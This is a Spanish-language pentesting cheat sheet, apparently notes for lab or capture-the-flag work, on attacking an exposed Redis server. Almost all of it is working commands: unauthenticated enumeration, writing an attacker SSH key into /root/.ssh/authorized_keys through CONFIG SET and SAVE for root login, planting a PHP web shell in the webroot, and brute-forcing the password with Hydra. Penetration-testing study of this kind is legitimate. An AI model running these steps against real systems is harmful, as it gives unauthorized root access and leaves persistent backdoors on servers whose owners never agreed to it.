# Enumeración y Ataque — Redis (Puerto 6379)

## Descripción

Redis es una base de datos en memoria muy usada como caché. Por defecto **no tiene autenticación**, lo que lo convierte en un vector muy directo cuando está expuesto. Permite escritura de archivos en el sistema, lo que puede llevar a RCE o escalada de privilegios.

**Puerto por defecto:** 6379

---

## Paso 1 — Conexión directa (sin autenticación)

```shell
redis-cli -h TARGET_IP

# Verificar que funciona
ping          # Debe responder PONG
info          # Información del servidor
```

---

## Paso 2 — Enumeración básica

```shell
redis-cli -h TARGET_IP

INFO server          # Versión y configuración
INFO keyspace        # Bases de datos con datos
KEYS *               # Listar todas las claves
GET clave            # Obtener valor de una clave
CONFIG GET dir       # Directorio de trabajo actual
CONFIG GET dbfilename # Nombre del archivo de base de datos
```

---

## Paso 3 — Escritura de clave SSH autorizada ⭐ (RCE)

Si Redis corre como root o como un usuario con directorio home:

```shell
# En Kali — generar par de claves SSH
ssh-keygen -t rsa -f /tmp/redis_key

# Preparar la clave pública con saltos de línea
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/redis_pub.txt

# Inyectar la clave en Redis
cat /tmp/redis_pub.txt | redis-cli -h TARGET_IP -x SET ssh_key

# Configurar Redis para escribir en el directorio .ssh
redis-cli -h TARGET_IP CONFIG SET dir /root/.ssh
redis-cli -h TARGET_IP CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET_IP SAVE

# Conectar por SSH con la clave privada
ssh -i /tmp/redis_key root@TARGET_IP
```

---

## Paso 4 — Escritura de webshell

Si conoces el webroot del servidor:

```shell
redis-cli -h TARGET_IP CONFIG SET dir /var/www/html
redis-cli -h TARGET_IP CONFIG SET dbfilename shell.php
redis-cli -h TARGET_IP SET payload "<?php system(\$_GET['cmd']); ?>"
redis-cli -h TARGET_IP SAVE

# Acceder desde el navegador
http://TARGET_IP/shell.php?cmd=id
```

---

## Paso 5 — Con autenticación (si tiene contraseña)

```shell
redis-cli -h TARGET_IP -a contraseña

# Fuerza bruta
hydra -P /usr/share/wordlists/rockyou.txt redis://TARGET_IP
```

---

## Checklist rápido

```
[ ] redis-cli -h TARGET → ping → ¿responde PONG sin autenticación?
[ ] INFO server → ver versión y usuario que ejecuta Redis
[ ] CONFIG GET dir → ver directorio actual
[ ] ¿Corre como root? → inyectar clave SSH en /root/.ssh
[ ] ¿Conoces el webroot? → escribir webshell PHP
[ ] Fuerza bruta con Hydra si tiene contraseña
```
